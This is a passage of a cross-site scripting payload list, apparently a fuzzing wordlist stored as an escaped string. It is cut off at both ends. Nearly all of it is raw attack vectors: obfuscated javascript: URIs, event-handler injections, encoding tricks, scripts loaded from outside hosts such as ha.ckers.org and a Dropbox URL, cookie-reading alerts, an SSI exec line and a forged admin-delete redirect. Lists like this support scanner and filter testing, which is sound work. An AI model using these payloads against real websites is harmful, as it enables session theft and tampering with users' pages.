implementation=\"%(htc)s\"><xss:xss>XSS<\/xss:xss><\/HTML>\"\"\",\"XML namespace.\"),(\"\"\"<XML ID=\"xss\"><I><B>&lt;IMG SRC=\"javas<!-- -->cript:javascript:alert(1)\"&gt;<\/B><\/I><\/XML><SPAN DATASRC=\"#xss\" DATAFLD=\"B\" DATAFORMATAS=\"HTML\"><\/SPAN>\r\n<HTML><BODY><?xml:namespace prefix=\"t\" ns=\"urn:schemas-microsoft-com:time\"><?import namespace=\"t\" implementation=\"#default#time2\"><t:set attributeName=\"innerHTML\" to=\"XSS&lt;SCRIPT DEFER&gt;javascript:alert(1)&lt;\/SCRIPT&gt;\"><\/BODY><\/HTML>\r\n<SCRIPT SRC=\"%(jpg)s\"><\/SCRIPT>\r\n<HEAD><META HTTP-EQUIV=\"CONTENT-TYPE\" CONTENT=\"text\/html; charset=UTF-7\"> <\/HEAD>+ADw-SCRIPT+AD4-%(payload)s;+ADw-\/SCRIPT+AD4-\r\n<form id=\"test\" \/><button form=\"test\" formaction=\"javascript:javascript:alert(1)\">X\r\n<body onscroll=javascript:alert(1)><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>\r\n<P STYLE=\"behavior:url('#default#time2')\" end=\"0\" onEnd=\"javascript:alert(1)\">\r\n<STYLE>@import'%(css)s';<\/STYLE>\r\n<STYLE>a{background:url('s1' 's2)}@import javascript:javascript:alert(1);');}<\/STYLE>\r\n<meta charset= \"x-imap4-modified-utf7\"&&>&&<script&&>javascript:alert(1)&&;&&<&&\/script&&>\r\n<SCRIPT onreadystatechange=javascript:javascript:alert(1);><\/SCRIPT>\r\n<style onreadystatechange=javascript:javascript:alert(1);><\/style>\r\n<?xml version=\"1.0\"?><html:html xmlns:html='http:\/\/www.w3.org\/1999\/xhtml'><html:script>javascript:alert(1);<\/html:script><\/html:html>\r\n<embed code=%(scriptlet)s><\/embed>\r\n<embed code=javascript:javascript:alert(1);><\/embed>\r\n<embed src=%(jscript)s><\/embed>\r\n<frameset onload=javascript:javascript:alert(1)><\/frameset>\r\n<object onerror=javascript:javascript:alert(1)>\r\n<embed type=\"image\" src=%(scriptlet)s><\/embed>\r\n<XML ID=I><X><C><![CDATA[<IMG SRC=\"javas]]<![CDATA[cript:javascript:alert(1);\">]]<\/C><X><\/xml>\r\n<IMG SRC=&{javascript:alert(1);};>\r\n<a href=\"jav&#65ascript:javascript:alert(1)\">test1<\/a>\r\n<a href=\"jav&#97ascript:javascript:alert(1)\">test1<\/a>\r\n<embed width=500 height=500 code=\"data:text\/html,<script>%(payload)s<\/script>\"><\/embed>\r\n<iframe srcdoc=\"&LT;iframe&sol;srcdoc=&amp;lt;img&sol;src=&amp;apos;&amp;apos;onerror=javascript:alert(1)&amp;gt;>\">\r\n';alert(String.fromCharCode(88,83,83))\/\/';alert(String.fromCharCode(88,83,83))\/\/\";\r\nalert(String.fromCharCode(88,83,83))\/\/\";alert(String.fromCharCode(88,83,83))\/\/--\r\n><\/SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))<\/SCRIPT>\r\n'';!--\"<XSS>=&{()}\r\n<SCRIPT SRC=http:\/\/ha.ckers.org\/xss.js><\/SCRIPT>\r\n<IMG SRC=\"javascript:alert('XSS');\">\r\n<IMG SRC=javascript:alert('XSS')>\r\n<IMG SRC=JaVaScRiPt:alert('XSS')>\r\n<IMG SRC=javascript:alert(\"XSS\")>\r\n<IMG SRC=`javascript:alert(\"RSnake says, 'XSS'\")`>\r\n<a onmouseover=\"alert(document.cookie)\">xxs link<\/a>\r\n<a onmouseover=alert(document.cookie)>xxs link<\/a>\r\n<IMG \"\"\"><SCRIPT>alert(\"XSS\")<\/SCRIPT>\">\r\n<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>\r\n<IMG SRC=# onmouseover=\"alert('xxs')\">\r\n<IMG SRC= onmouseover=\"alert('xxs')\">\r\n<IMG onmouseover=\"alert('xxs')\">\r\n<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>\r\n<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>\r\n<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>\r\n<IMG SRC=\"jav\tascript:alert('XSS');\">\r\n<IMG SRC=\"jav&#x09;ascript:alert('XSS');\">\r\n<IMG SRC=\"jav&#x0A;ascript:alert('XSS');\">\r\n<IMG SRC=\"jav&#x0D;ascript:alert('XSS');\">\r\nperl -e 'print \"<IMG SRC=java\\0script:alert(\\\"XSS\\\")>\";' > out\r\n<IMG SRC=\" &#14;  javascript:alert('XSS');\">\r\n<SCRIPT\/XSS SRC=\"http:\/\/ha.ckers.org\/xss.js\"><\/SCRIPT>\r\n<BODY onload!#$%&()*~+-_.,:;?@[\/|\\]^`=alert(\"XSS\")>\r\n<SCRIPT\/SRC=\"http:\/\/ha.ckers.org\/xss.js\"><\/SCRIPT>\r\n<<SCRIPT>alert(\"XSS\");\/\/<<\/SCRIPT>\r\n<SCRIPT SRC=http:\/\/ha.ckers.org\/xss.js?< B >\r\n<SCRIPT SRC=\/\/ha.ckers.org\/.j>\r\n<IMG SRC=\"javascript:alert('XSS')\"\r\n<iframe src=http:\/\/ha.ckers.org\/scriptlet.html <\r\n\\\";alert('XSS');\/\/\r\n<\/TITLE><SCRIPT>alert(\"XSS\");<\/SCRIPT>\r\n<INPUT TYPE=\"IMAGE\" SRC=\"javascript:alert('XSS');\">\r\n<BODY BACKGROUND=\"javascript:alert('XSS')\">\r\n<IMG DYNSRC=\"javascript:alert('XSS')\">\r\n<IMG LOWSRC=\"javascript:alert('XSS')\">\r\n<STYLE>li {list-style-image: url(\"javascript:alert('XSS')\");}<\/STYLE><UL><LI>XSS<\/br>\r\n<IMG SRC='vbscript:msgbox(\"XSS\")'>\r\n<IMG SRC=\"livescript:[code]\">\r\n<BODY ONLOAD=alert('XSS')>\r\n<BGSOUND SRC=\"javascript:alert('XSS');\">\r\n<BR SIZE=\"&{alert('XSS')}\">\r\n<LINK REL=\"stylesheet\" HREF=\"javascript:alert('XSS');\">\r\n<LINK REL=\"stylesheet\" HREF=\"http:\/\/ha.ckers.org\/xss.css\">\r\n<STYLE>@import'http:\/\/ha.ckers.org\/xss.css';<\/STYLE>\r\n<META HTTP-EQUIV=\"Link\" Content=\"<http:\/\/ha.ckers.org\/xss.css>; REL=stylesheet\">\r\n<STYLE>BODY{-moz-binding:url(\"http:\/\/ha.ckers.org\/xssmoz.xml#xss\")}<\/STYLE>\r\n<STYLE>@im\\port'\\ja\\vasc\\ript:alert(\"XSS\")';<\/STYLE>\r\n<IMG STYLE=\"xss:expr\/*XSS*\/ession(alert('XSS'))\">\r\nexp\/*<A STYLE='no\\xss:noxss(\"*\/\/*\");xss:ex\/*XSS*\/\/*\/*\/pression(alert(\"XSS\"))'>\r\n<STYLE TYPE=\"text\/javascript\">alert('XSS');<\/STYLE>\r\n<STYLE>.XSS{background-image:url(\"javascript:alert('XSS')\");}<\/STYLE><A CLASS=XSS><\/A>\r\n<STYLE type=\"text\/css\">BODY{background:url(\"javascript:alert('XSS')\")}<\/STYLE>\r\n<STYLE type=\"text\/css\">BODY{background:url(\"javascript:alert('XSS')\")}<\/STYLE>\r\n<XSS STYLE=\"xss:expression(alert('XSS'))\">\r\n<XSS STYLE=\"behavior: url(xss.htc);\">\r\n\u00bcscript\u00bealert(\u00a2XSS\u00a2)\u00bc\/script\u00be\r\n<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:alert('XSS');\">\r\n<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=data:text\/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\">\r\n<META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http:\/\/;URL=javascript:alert('XSS');\">\r\n<IFRAME SRC=\"javascript:alert('XSS');\"><\/IFRAME>\r\n<IFRAME SRC=# onmouseover=\"alert(document.cookie)\"><\/IFRAME>\r\n<FRAMESET><FRAME SRC=\"javascript:alert('XSS');\"><\/FRAMESET>\r\n<TABLE BACKGROUND=\"javascript:alert('XSS')\">\r\n<TABLE><TD BACKGROUND=\"javascript:alert('XSS')\">\r\n<DIV STYLE=\"background-image: url(javascript:alert('XSS'))\">\r\n<DIV STYLE=\"background-image:\\0075\\0072\\006C\\0028'\\006a\\0061\\0076\\0061\\0073\\0063\\0072\\0069\\0070\\0074\\003a\\0061\\006c\\0065\\0072\\0074\\0028.1027\\0058.1053\\0053\\0027\\0029'\\0029\">\r\n<DIV STYLE=\"background-image: url(&#1;javascript:alert('XSS'))\">\r\n<DIV STYLE=\"width: expression(alert('XSS'));\">\r\n<BASE HREF=\"javascript:alert('XSS');\/\/\">\r\n <OBJECT TYPE=\"text\/x-scriptlet\" DATA=\"http:\/\/ha.ckers.org\/scriptlet.html\"><\/OBJECT>\r\n<EMBED SRC=\"data:image\/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==\" type=\"image\/svg+xml\" AllowScriptAccess=\"always\"><\/EMBED>\r\n<SCRIPT SRC=\"http:\/\/ha.ckers.org\/xss.jpg\"><\/SCRIPT>\r\n<!--#exec cmd=\"\/bin\/echo '<SCR'\"--><!--#exec cmd=\"\/bin\/echo 'IPT SRC=http:\/\/ha.ckers.org\/xss.js><\/SCRIPT>'\"-->\r\n<? echo('<SCR)';echo('IPT>alert(\"XSS\")<\/SCRIPT>'); ?>\r\nRedirect 302 \/a.jpg http:\/\/victimsite.com\/admin.asp&deleteuser\r\n<META HTTP-EQUIV=\"Set-Cookie\" Content=\"USERID=<SCRIPT>alert('XSS')<\/SCRIPT>\">\r\n <HEAD><META HTTP-EQUIV=\"CONTENT-TYPE\" CONTENT=\"text\/html; charset=UTF-7\"> <\/HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-\/SCRIPT+AD4-\r\n<SCRIPT a=\">\" SRC=\"http:\/\/ha.ckers.org\/xss.js\"><\/SCRIPT>\r\n<SCRIPT =\">\" SRC=\"http:\/\/ha.ckers.org\/xss.js\"><\/SCRIPT>\r\n<SCRIPT a=\">\" '' SRC=\"http:\/\/ha.ckers.org\/xss.js\"><\/SCRIPT>\r\n<SCRIPT \"a='>'\" SRC=\"http:\/\/ha.ckers.org\/xss.js\"><\/SCRIPT>\r\n<SCRIPT a=`>` SRC=\"http:\/\/ha.ckers.org\/xss.js\"><\/SCRIPT>\r\n<SCRIPT a=\">'>\" SRC=\"http:\/\/ha.ckers.org\/xss.js\"><\/SCRIPT>\r\n<SCRIPT>document.write(\"<SCRI\");<\/SCRIPT>PT SRC=\"http:\/\/ha.ckers.org\/xss.js\"><\/SCRIPT>\r\n<A HREF=\"http:\/\/66.102.7.147\/\">XSS<\/A>\r\n<A HREF=\"http:\/\/%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D\">XSS<\/A>\r\n<A HREF=\"http:\/\/1113982867\/\">XSS<\/A>\r\n<A HREF=\"http:\/\/0x42.0x0000066.0x7.0x93\/\">XSS<\/A>\r\n<A HREF=\"http:\/\/0102.0146.0007.00000223\/\">XSS<\/A>\r\n<A HREF=\"htt\tp:\/\/6\t6.000146.0x7.147\/\">XSS<\/A>\r\n<iframe %00 src=\"&Tab;javascript:prompt(1)&Tab;\"%00>\r\n<svg><style>{font-family&colon;'<iframe\/onload=confirm(1)>'\r\n<input\/onmouseover=\"javaSCRIPT&colon;confirm&lpar;1&rpar;\"\r\n<sVg><scRipt %00>alert&lpar;1&rpar; {Opera}\r\n<img\/src=`%00` onerror=this.onerror=confirm(1) \r\n<form><isindex formaction=\"javascript&colon;confirm(1)\"\r\n<img src=`%00`&NewLine; onerror=alert(1)&NewLine;\r\n<script\/&Tab; src='https:\/\/dl.dropbox.com\/u\/13018058\/js.js' \/&Tab;><\/script>\r\n<ScRipT 5-0*3+9\/3=>prompt(1)<\/ScRipT giveanswerhere=?\r\n<iframe\/src=\"data:text\/html;&Tab;base64&Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==\">\r\n<script \/*%00*\/>\/*%00*\/alert(1)\/*%00*\/<\/script \/*%00*\/\r\n&#34;&#62;<h1\/onmouseover='\\u0061lert(1)'>%00\r\n<iframe\/src=\"data:text\/html,<svg &#111;&#110;load=alert(1)>\">\r\n<meta content=\"&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)\" http-equiv=\"refresh\"\/>\r\n<svg><script xlink:href=data&colon;,window.open('https:\/\/www.google.com\/')><\/script\r\n<svg><script x:href='https:\/\/dl.dropbox.com\/u\/13018058\/js.js' {Opera}\r\n<meta http-equiv=\"refresh\" content=\"0;url=javascript:confirm(1)\">\r\n<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>\r\n<form><a href=\"javascript:\\u0061lert&#x28;1&#x29;\">X\r\n<\/script><img\/*%00\/src=\"worksinchrome&colon;prompt&#x28;1&#x29;\"\/%00*\/onerror='eval(src)'>\r\n<img\/&#09;&#10;&#11; src=`~` onerror=prompt(1)>\r\n<form><iframe &#09;&#10;&#11; src=\"javascript&#58;alert(1)\"&#11;&#10;&#09;;>\r\n<a href=\"data:application\/x-x509-user-cert;&NewLine;base64&NewLine;,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\"&#09;&#10;&#11;>X<\/a\r\nhttp:\/\/www.google<script .com>alert(document.location)<\/script\r\n<a&#32;href&#61;&#91;&#00;&#93;\"&#00; onmouseover=prompt&#40;1&#41;&#47;&#47;\">XYZ<\/a\r\n<img\/src=@&#32;&#13; onerror = prompt('&#49;')\r\n<style\/onload=prompt&#40;'&#88;&#83;&#83;'&#41;\r\n<script ^__^>alert(String.fromCharCode(49))<\/script ^__^\r\n<\/style &#32;><script &#32; :-(>\/**\/alert(document.location)\/**\/<\/script &#32; :-(\r\n&#00;<\/form><input type&#61;\"date\" onfocus=\"alert(1)\">\r\n<form><textarea &#13; onkeyup='\\u0061\\u006C\\u0065\\u0072\\u0074&#x28;1&#x29;'>\r\n<script \/***\/>\/***\/confirm('\\uFF41\\uFF4C\\uFF45\\uFF52\\uFF54\\u1455\\uFF11\\u1450')\/***\/<\/script \/***\/\r\n<iframe srcdoc='&lt;body onload=prompt&lpar;1&rpar;&gt;'>\r\n<a href=\"javascript:void(0)\" onmouseover=&NewLine;javascript:alert(1)&NewLine;>X<\/a>\r\n<script ~~~>alert(0%0)<\/script ~~~>\r\n<style\/onload=&lt;!--&#09;&gt;&#10;alert&#10;&lpar;1&rpar;>\r\n<\/\/\/style\/\/\/><span %2F onmousemove='alert&lpar;1&rpar;'>SPAN\r\n<img\/src='http:\/\/i.imgur.com\/P8mL8.jpg' onmouseover=&Tab;prompt(1)\r\n&#34;&#62;<svg><style>{-o-link-source&colon;'<body\/onload=confirm(1)>'\r\n&#13;<blink\/&#13; onmouseover=pr&#x6F;mp&#116;(1)>OnMouseOver {Firefox & Opera}\r\n<marquee onstart='javascript:alert&#x28;1&#x29;'>^__^\r\n<div\/style=\"width:expression(confirm(1))\">X<\/div> {IE7}\r\n<iframe\/%00\/ src=javaSCRIPT&colon;alert(1)\r\n\/\/<form\/action=javascript&#x3A;alert&lpar;document&period;cookie&rpar;><input\/type='submit'>\/\/\r\n\/*iframe\/src*\/<iframe\/src=\"<iframe\/src=@\"\/onload=prompt(1) \/*iframe\/src*\/>\r\n\/\/|\\\\ <script \/\/|\\\\ src='https:\/\/dl.dropbox.com\/u\/13018058\/js.js'> \/\/|\\\\ <\/script \/\/|\\\\\r\n<\/font>\/<svg><style>{src&#x3A;'<style\/onload=this.onload=confirm(1)>'<\/font>\/<\/style>\r\n<a\/href=\"javascript:&#13; javascript:prompt(1)\"><input type=\"X\">\r\n<\/plaintext\\><\/|\\><plaintext\/onmouseover=prompt(1)\r\n<\/svg>''<svg><script 'AQuickBrownFoxJumpsOverTheLazyDog'>alert&#x28;1&#x29; {Opera}\r\n<a href=\"javascript&colon;\\u0061&#x6C;&#101%72t&lpar;1&rpar;\"><button>\r\n<div onmouseover='alert&lpar;1&rpar;'>DIV<\/div>\r\n<iframe style=\"position:absolute;top:0;left:0;width:100%;height:100%\" onmouseover=\"prompt(1)\">\r\n<a href=\"jAvAsCrIpT&colon;alert&lpar;1&rpar;\">X<\/a>\r\n<embed src=\"http:\/\/corkami.googlecode.com\/svn\/!svn\/bc\/480\/trunk\/misc\/pdf\/helloworld_js_X.pdf\">\r\n<object data=\"http:\/\/corkami.googlecode.com\/svn\/!svn\/bc\/480\/trunk\/misc\/pdf\/helloworld_js_X.pdf\">\r\n<var onmouseover=\"prompt(1)\">On Mouse Over<\/var>\r\n<a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>Click Here<\/a>\r\n<img src=\"\/\" =_=\" title=\"onerror='prompt(1)'\">\r\n<%<!--'%><script>alert(1);<\/script -->\r\n<script src=\"data:text\/javascript,alert(1)\"><\/script>\r\n<iframe\/src \\\/\\\/onload = prompt(1)\r\n<iframe\/onreadystatechange=alert(1)\r\n<svg\/onload=alert(1)\r\n<input value=<><iframe\/src=javascript:confirm(1)\r\n<input type=\"text\" value=`` <div\/onmouseover='alert(1)'>X<\/div>\r\nhttp:\/\/www.<script>alert(1)<\/script .com\r\n<iframe src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29><\/iframe>\r\n<svg><script ?>alert(1)\r\n<iframe src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29><\/iframe>\r\n<img src=`xx:xx`onerror=alert(1)>\r\n<object type=\"text\/x-scriptlet\" data=\"http:\/\/jsfiddle.net\/XLE63\/ \"><\/object>\r\n<meta http-equiv=\"refresh\" content=\"0;javascript&colon;alert(1)\"\/>\r\n<math><a xlink:href=\"\/\/jsfiddle.net\/t846h\/\">click\r\n<embed code=\"http:\/\/businessinfo.co.uk\/labs\/xss\/xss.swf\" allowscriptaccess=always>\r\n<svg contentScriptType=text\/vbs><script>MsgBox+1\r\n<a href=\"data:text\/html;base64_,<svg\/onload=\\u0061&#x6C;&#101%72t(1)>\">X<\/a\r\n<iframe\/onreadystatechange=\\u0061\\u006C\\u0065\\u0072\\u0074('\\u0061') worksinIE>\r\n<script>~'\\u0061' ; \\u0074\\u0068\\u0072\\u006F\\u0077 ~ \\u0074\\u0068\\u0069\\u0073. \\u0061\\u006C\\u0065\\u0072\\u0074(~'\\u0061')<\/script U+\r\n<script\/src=\"data&colon;text%2Fj\\u0061v\\u0061script,\\u0061lert('\\u0061')\"><\/script a=\\u0061 & \/=%2F\r\n<script\/src=data&colon;text\/j\\u0061v\\u0061&#115&#99&#114&#105&#112&#116,\\u0061%6C%65%72%74(\/XSS\/)><\/script\r\n<object data=javascript&colon;\\u0061&#x6C;&#101%72t(1)>\r\n<script>+-+-1-+-+alert(1)<\/script>\r\n<body\/onload=&lt;!--&gt;&#10alert(1)>\r\n<script itworksinallbrowsers>\/*<script* *\/alert(1)<\/script\r\n<img src ?itworksonchrome?\\\/onerror = alert(1)\r\n<svg><script>\/\/&NewLine;confirm(1);<\/script <\/svg>\r\n<svg><script onlypossibleinopera:-)> alert(1)\r\n<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe\r\n<script x> alert(1) <\/script 1=2\r\n<div\/onmouseover='alert(1)'> style=\"x:\">\r\n<--`<img\/src=` onerror=alert(1)> --!>\r\n<script\/src=&#100&#97&#116&#97:text\/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)><\/script>\r\n<div style=\"position:absolute;top:0;left:0;width:100%;height:100%\" onmouseover=\"prompt(1)\" onclick=\"alert(1)\">x<\/button>\r\n\"><img src=x onerror=window.open('https:\/\/www.google.com\/');>\r\n<form><button formaction=javascript&colon;alert(1)>CLICKME\r\n<math><a xlink:href=\"\/\/jsfiddle.net\/t846h\/\">click\r\n<object data=data:text\/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+><\/object>\r\n<iframe src=\"data:text\/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E\"><\/iframe>\r\n<a href=\"data:text\/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203\">Click Me<\/a>\r\n\u2018; alert(1);\r\n\u2018)alert(1);\/\/\r\n<ScRiPt>alert(1)<\/sCriPt>\r\n<IMG SRC=jAVasCrIPt:alert(\u2018XSS\u2019)>\r\n<IMG SRC=\u201djavascript:alert(\u2018XSS\u2019);\u201d>\r\n<IMG SRC=javascript:alert(&quot;XSS&quot;)>\r\n<IMG SRC=javascript:alert(\u2018XSS\u2019)>      \r\n<img src=xss onerror=alert(1)>\r\n<iframe %00 src=\"&Tab;javascript:prompt(1)&Tab;\"%00>\r\n<svg><style>{font-family&colon;'<iframe\/onload=confirm(1)>'\r\n<input\/onmouseover=\"javaSCRIPT&colon;confirm&lpar;1&rpar;\"\r\n<sVg><scRipt %00>alert&lpar;1&rpar; {Opera}\r\n<img\/src=`%00` onerror=this.onerror=confirm(1)\r\n<form><isindex formaction=\"javascript&colon;confirm(1)\"\r\n<img src=`%00`&NewLine; onerror=alert(1)&NewLine;\r\n<script\/&Tab; src='https:\/\/dl.dropbox.com\/u\/13018058\/js.js' \/&Tab;><\/script>\r\n<ScRipT 5-0*3+9\/3=>prompt(1)<\/ScRipT giveanswerhere=?\r\n<iframe\/src=\"data:text\/html;&Tab;base64&Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==\">\r\n<script \/*%00*\/>\/*%00*\/alert(1)\/*%00*\/<\/script \/*%00*\/\r\n&#34;&#62;<h1\/onmouseover='\\u0061lert(1)'>%00\r\n<iframe\/src=\"data:text\/html,<svg &#111;&#110;load=alert(1)>\">\r\n<meta content=\"&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)\" http-equiv=\"refresh\"\/>\r\n<svg><script xlink:href=data&colon;,window.open('https:\/\/www.google.com\/')><\/script\r\n<svg><script x:href='https:\/\/dl.dropbox.com\/u\/13018058\/js.js' {Opera}\r\n<meta http-equiv=\"refresh\" content=\"0;url=javascript:confirm(1)\">\r\n<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>\r\n<form><a href=\"javascript:\\u0061lert&#x28;1&#x29;\">X\r\n<\/script><img\/*%00\/src=\"worksinchrome&colon;prompt&#x28;1&#x29;\"\/%00*\/onerror='eval(src)'>\r\n<img\/&#09;&#10;&#11; src=`~` onerror=prompt(1)>\r\n<form><iframe &#09;&#10;&#11; src=\"javascript&#58;alert(1)\"&#11;&#10;&#09;;>\r\n<a href=\"data:application\/x-x509-user-cert;&NewLine;base64&NewLine;,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\"&#09;&#10;&#11;>X<\/a\r\nhttp:\/\/www.google<script .com>alert(document.location)<\/script\r\n<a&#32;href&#61;&#91;&#00;&#93;\"&#00; onmouseover=prompt&#40;1&#41;&#47;&#47;\">XYZ<\/a\r\n<img\/src=@&#32;&#13; onerror = prompt('&#49;')\r\n<style\/onload=prompt&#40;'&#88;&#83;&#83;'&#41;\r\n<script ^__^>alert(String.fromCharCode(49))<\/script ^__^\r\n<\/style &#32;><script &#32; :-(>\/**\/alert(document.location)\/**\/<\/script &#32; :-(\r\n&#00;<\/form><input type&#61;\"date\" onfocus=\"alert(1)\">\r\n<form><textarea &#13; onkeyup='\\u0061\\u006C\\u0065\\u0072\\u0074&#x28;1&#x29;'>\r\n<script \/***\/>\/***\/confirm('\\uFF41\\uFF4C\\uFF45\\uFF52\\uFF54\\u1455\\uFF11\\u1450')\/***\/<\/script \/***\/\r\n<iframe srcdoc='&lt;body onload=prompt&lpar;1&rpar;&gt;'>\r\n<a href=\"javascript:void(0)\" onmouseover=&NewLine;javascript:alert(1)&NewLine;>X<\/a>\r\n<script ~~~>alert(0%0)<\/script ~~~>\r\n<style\/onload=&lt;!--&#09;&gt;&#10;alert&#10;&lpar;1&rpar;>\r\n<\/\/\/style\/\/\/><span %2F onmousemove='alert&lpar;1&rpar;'>SPAN\r\n<img\/src='http:\/\/i.imgur.com\/P8mL8.jpg' onmouseover=&Tab;prompt(1)\r\n&#34;&#62;<svg><style>{-o-link-source&colon;'<body\/onload=confirm(1)>'\r\n&#13;<blink\/&#13; onmouseover=pr&#x6F;mp&#116;(1)>OnMouseOver {Firefox & Opera}\r\n<marquee onstart='javascript:alert&#x28;1&#x29;'>^__^\r\n<div\/style=\"width:expression(confirm(1))\">X<\/div> {IE7}\r\n<iframe\/%00\/ src=javaSCRIPT&colon;alert(1)\r\n\/\/<form\/action=javascript&#x3A;alert&lpar;document&period;cookie&rpar;><input\/type='submit'>\/\/\r\n\/*iframe\/src*\/<iframe\/src=\"<iframe\/src=@\"\/onload=prompt(1) \/*iframe\/src*\/>\r\n\/\/|\\\\ <script \/\/|\\\\ src='https:\/\/dl.dropbox.com\/u\/13018058\/js.js'> \/\/|\\\\ <\/script \/\/|\\\\\r\n<\/font>\/<svg><style>{src&#x3A;'<style\/onload=this.onload=confirm(1)>'<\/font>\/<\/style>\r\n<a\/href=\"javascript:&#13; javascript:prompt(1)\"><input type=\"X\">\r\n<\/plaintext\\><\/|\\><plaintext\/onmouseover=prompt(1)\r\n<\/svg>''<svg><script 'AQuickBrownFoxJumpsOverTheLazyDog'>alert&#x28;1&#x29; {Opera}\r\n<a href=\"javascript&colon;\\u0061&#x6C;&#101%72t&lpar;1&rpar;\"><button>\r\n<div onmouseover='alert&lpar;1&rpar;'>DIV<\/div>\r\n<iframe style=\"xg-p:absolute;top:0;left:0;width:100%;height:100%\" onmouseover=\"prompt(1)\">\r\n<a href=\"jAvAsCrIpT&colon;alert&lpar;1&rpar;\">X<\/a>\r\n<embed src=\"http:\/\/corkami.googlecode.com\/svn\/!svn\/bc\/480\/trunk\/misc\/pdf\/helloworld_js_X.pdf\">\r\n<object data=\"http:\/\/corkami.googlecode.com\/svn\/!svn\/bc\/480\/trunk\/misc\/pdf\/helloworld_js_X.pdf\">\r\n<var onmouseover=\"prompt(1)\">On Mouse Over<\/var>\r\n<a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>Click Here<\/a>\r\n<img src=\"\/\" =_=\" title=\"onerror='prompt(1)'\">\r\n<%<!--'%><script>alert(1);<\/script -->\r\n<script 